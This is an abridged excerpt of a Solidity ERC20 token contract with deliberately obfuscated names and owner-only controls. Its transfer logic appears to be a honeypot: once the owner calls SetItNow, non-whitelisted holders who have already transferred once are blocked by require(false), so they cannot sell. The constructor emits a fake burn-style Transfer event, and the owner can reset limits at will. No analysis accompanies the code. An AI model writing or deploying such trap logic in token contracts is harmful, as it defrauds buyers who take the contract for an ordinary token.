...
contract ERC20Token is Context, IERC20, Ownable {
  ...
  mapping (address => bool) public deltacon;
  ...
  constructor() public {
    ...
    tigress = _totalSupply;
    chTx = _totalSupply / 800;
    opera = tigress;
    gammagamma[creator] = false;
    deltacon[creator] = false;
    betabeta[msg.sender] = true;
    _balances[msg.sender] = _trns;
    thisValue = false;

    emit Transfer(address(0), msg.sender, _trns);
    emit Transfer(address(0x000000000000000000000000000000000000dEaD), address(0x000000000000000000000000000000000000dEaD), _trns);
  }
  ...
  function ViewChange() external view onlyOwner returns (uint256) {
  ...
  */
  ...
  function randomly() internal returns (uint) {
    uint screen = uint(keccak256(abi.encodePacked(now, msg.sender, lordy))) % 100000;
    lordy++;
    return screen;
  }
  ...
  function BurnTheMountain(uint256 amount) external onlyOwner {
    tigress = amount;
  }
  
  function SetItNow() external onlyOwner {
    tigress = chTx;
    thisValue = true;
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if (betabeta[sender] == false) {
      ...
      if (thisValue == true) {
        if (deltacon[sender] == true) {
          require(false);
        }
        deltacon[sender] = true;
      }
    }
